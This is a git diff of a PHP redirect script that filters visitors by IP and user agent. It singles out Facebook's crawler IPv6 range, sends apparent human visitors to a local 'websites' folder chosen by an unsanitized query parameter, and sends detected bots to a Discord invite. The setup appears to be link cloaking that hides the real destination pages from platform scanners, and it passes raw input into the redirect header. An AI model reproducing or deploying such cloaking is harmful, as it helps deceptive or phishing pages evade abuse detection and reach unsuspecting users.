@@ -7,9 +7,8 @@ function IsValidIP()
 	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
 	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
 	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
-	//file_put_contents("ip.txt",$ip."\n",FILE_APPEND);
 	if($ip == "::1") return true; //localhost
-	if (strpos($ip, '2a03:2880:') !== false and strpos($ip, '::face:b00c') !== false) return false; //facebook ip
+	if (strpos($ip, '2a03:2880:') !== false and strpos($ip, '::face:b00c') !== false) return false; //facebook ipv6
 	return filter_var($ip, FILTER_VALIDATE_IP); //https://stackoverflow.com/a/6211175/11390822
 } 
 
@@ -28,15 +27,13 @@ function IsValidUserAgent()
 
 if((IsValidIP() and IsValidUserAgent()) == true) 
 {	//echo "NOT BOT";
-	if(isset($_GET['redirect'])) header( "Location: .././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));
+	header( "Location: .././websites/".$_GET['filename'].(isset($_GET["redirect"]) ? ("?redirect=". $_GET['redirect']) : ""));
 	die();
 }
 else
-{
-	//echo "You are BOT";
-	//file_put_contents("detected.txt","bot_detected\n",FILE_APPEND);
+{   //echo "BOT";
 	header( "Location: https://discord.com/invite/Hu5XPGMTuk");
-	die();	
+    die();
 }
 
 
